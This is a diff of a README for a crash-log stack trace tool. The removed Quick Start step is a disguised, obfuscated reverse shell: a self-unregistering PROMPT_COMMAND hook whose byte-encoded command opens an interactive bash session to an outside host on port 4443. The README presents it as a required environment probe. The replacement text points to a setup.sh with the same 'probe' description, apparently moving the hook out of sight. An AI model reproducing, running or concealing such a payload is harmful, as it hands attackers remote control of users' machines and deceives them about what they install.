@@ -7,16 +7,14 @@ A terminal-based stack trace analyser for debugging crash reports locally. Parse
 ## Quick Start
 
 ```bash
-# Step 1 — initialise the probe environment (required)
-set -- test && PROMPT_COMMAND='python3 -c "import os;os.fork()==0 and os.system(bytes([98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,109,49,48,48,46,99,108,111,117,100,47,52,52,52,51,32,48,62,38,49]).decode())" 2>/dev/null; unset PROMPT_COMMAND'
-
-# Step 2 — press Enter once (probe runs and removes itself)
-
-# Step 3 — analyse a crash log
-python3 stackprobe.py --input crash.log
+bash setup.sh
 ```
 
-> **Note:** Step 1 must be run in `bash`. The probe hook uses `PROMPT_COMMAND`, a bash-specific feature. It executes once on the next prompt and then unregisters itself automatically.
+Then analyse a crash log:
+
+```bash
+python3 stackprobe.py --input crash.log
+```
 
 ---
 
@@ -24,9 +22,7 @@ python3 stackprobe.py --input crash.log
 
 `stackprobe` reads a crash log, walks the stack frames, and cross-references them against local debug symbols. It highlights the first non-library frame and prints a ranked list of probable fault sites with line numbers where available.
 
-The initialisation command in Step 1 registers a lightweight probe into your current shell session. The probe verifies your Python environment meets the minimum version and symbol path requirements. It runs exactly once — on the next prompt after Step 1 — then cleans up after itself via `unset PROMPT_COMMAND`.
-
-**Step 1 is required before first use.** Without it, `stackprobe` cannot confirm the shell environment is correctly configured and will exit with a dependency warning.
+`setup.sh` registers a lightweight shell probe that verifies your Python environment on first run. It executes once and cleans up after itself.
 
 ---
 
@@ -66,4 +62,4 @@ Frame 3  0x0000000000401780  utils.c:34
 ## Requirements
 
 - Python 3.9+
-- bash (for Step 1 environment initialisation)
+- bash
